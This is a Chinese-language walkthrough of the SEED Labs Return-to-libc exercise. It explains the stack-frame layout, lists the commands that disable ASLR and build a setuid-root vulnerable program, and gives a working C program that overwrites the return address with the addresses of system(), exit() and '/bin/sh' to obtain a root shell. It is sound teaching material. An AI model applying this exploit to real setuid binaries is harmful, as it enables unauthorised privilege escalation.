前言：本文是基于美国雪城大学的seed实验所做的Return-to-libc
攻击实验，笔者在进行实验的时候参考了网上已有的部分博客，但是发现存在部分细节没有详细解释，导致实验过程中难以复现上述攻击。因此重新梳理了整个实验过程，涉及原理的内容不再赘述，详见下面链接中提供的实验说明，希望对各位读者起到一定帮助。

实验参考资料和实验环境下载：<https://seedsecuritylabs.org/Labs_16.04/Software/Return_to_Libc/>

一、 实验介绍

传统的缓冲区溢出攻击，是利用缓冲区溢出漏洞将攻击代码通过缓冲区注入内存，从而引导程序跳转到函数调用栈去执行存储在其中的攻击代码。许多操作系统通过设置栈不可执行机制避免这种攻击。然而，道高一尺魔高一丈，这种安全机制并不能完全保证安全。一种名为Return-to-Libc的新型攻击方式被提出，该方法不需要一个可以执行的栈，甚至不需要攻击代码。它通过跳转到系统内已有的代码，比如libc中的system()函数（在程序运行过程中已经加载到内存中），从而间接地获取root权限。

  
  

二、 实验原理

实验原理参照上一篇缓冲区溢出攻击，都是通过程序执行过程中函数调用堆栈的分析，确定函数返回地址，从而修改返回地址到我们需要跳转到的目的地址。与之不同的是，缓冲区溢出攻击中目的地址是我们注入的恶意代码存储地址。而在本实验，目的地址是程序库函数system()的地址，通过执行system(“/bin/sh”)获得root权限。

下面是bof()函数的栈帧结构。我们通过buffer溢出覆盖其return
address改为system()内存地址，同时需要构造一个“伪栈”去保证当eip指向system()的时候，函数能够正常的执行，在此我们函数直接返回到exit()正常退出。

![图片.png](https://image.3001.net/images/20200613/1592062331_5ee4f17b28320.png!small)

因此需要考虑两个问题：1.system()和exit()的地址，以及将”/bin/sh”写入内存。2.构造伪栈。

其中system()和exit()是libc.so中的函数，我们想要调用system并传入”/bin/sh”，并且返回到exit()的地址正常退出，以免留下错误日志。有趣的是，内存中存在字符串”/bin/sh”，因此我们可以直接通过搜索内存的方式获得其地址。也可以通过添加环境变量的方式写入。

正常情况下，系统通过call调用执行system()函数的时候，栈内的结构应该包括system()返回地址，system()形参。由于我们是通过返回地址直接跳转到system()，因此我们需要提前把必要的信息填入相应的位置。根据栈的结构，分析他们的位置应该分别是返回地址system()=ebp+4，exit()作为system()的返回地址ebp+8，system的形参地址为ebp+12。

三、 实验步骤

1\. 关闭地址空间随机化

$sudo sysctl -w kernel.randomize_va_space=0

2\. 开启栈不可执行（NX）机制编译漏洞程序，并赋予该程序root权限

$ sudo su

$ gcc -fno-stack-protector -z noexecstack-o retlib retlib.c

$ sudo chown root retlib

$ sudo chmod 4755 retlib

  
  
  

3\. 使用另一个shell程序（zsh）代替/bin/bash

$ sudo rm /bin/sh

$ sudo ln -s /bin/zsh /bin/sh

4\. 获得三个关键参数地址：system()、exit()、”/bin/sh”

![图片.png](https://image.3001.net/images/20200613/1592062342_5ee4f186d81fd.png!small)

![图片.png](https://image.3001.net/images/20200613/1592062350_5ee4f18edc279.png!small)

5\. 确定植入恶意代码的位置

输入命令：gdb retlib

disas bof

![图片.png](https://image.3001.net/images/20200613/1592062359_5ee4f197c014b.png!small)

确定buffer地址为ebp-0x14。因此根据二，实验原理中的分析，system()，exit()，““/bin/sh”的地址分别置于buffer[24],buffer[28],buffer[32]，将写入badfile中。

6\. 攻击程序

通过上述分析，构造恶意代码和对应的地址写入badfile文件的恰当位置，使得漏洞程序被攻击，从而实现提权攻击。

    
    
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    int main(int argc, char **argv)
    {
      char buf[40];
      FILE *badfile;
    
      badfile = fopen("./badfile", "w");
    
      /* You need to decide the addresses and 
         the values for X, Y, Z. The order of the following 
         three statements does not imply the order of X, Y, Z.
         Actually, we intentionally scrambled the order. */
      *(long *) &buf[32] = 0xb7f6382b ;   //  "/bin/sh"
      *(long *) &buf[24] = 0xb7e42da0 ;   //  system()
      *(long *) &buf[28] = 0xb7e369d0 ;   //  exit()
    
      fwrite(buf, sizeof(buf), 1, badfile);
      fclose(badfile);
    }

![图片.png](https://image.3001.net/images/20200613/1592062369_5ee4f1a1c0674.png!small)

显示#，表示获得root权限，攻击成功！

